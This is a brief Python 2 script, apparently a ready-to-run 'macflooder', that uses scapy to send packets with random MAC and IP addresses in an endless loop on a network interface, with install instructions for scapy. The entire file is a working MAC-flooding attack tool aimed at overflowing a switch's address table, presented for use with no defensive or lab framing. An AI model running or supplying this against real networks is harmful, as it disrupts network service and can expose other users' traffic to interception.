#!/usr/bin/python
"""
simple implementation of macflooder on your switch layer 2 env with scapy
you'll need scapy 
apt-get install scapy 
pip install scapy
http://www.secdev.org/projects/scapy/
"""

import sys
from scapy.all import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
				dst=RandMAC("*:*:*:*:*:*")) / \
				IP(src=RandIP("*.*.*.*"),
				dst=RandIP("*.*.*.*")) / \
				ICMP()

if len(sys.argv) < 2:
	dev = "eth0"
else:
	dev = sys.argv[1]

print "flooding network with random packet on dev " + dev
sendp(packet, iface=dev, loop=1)
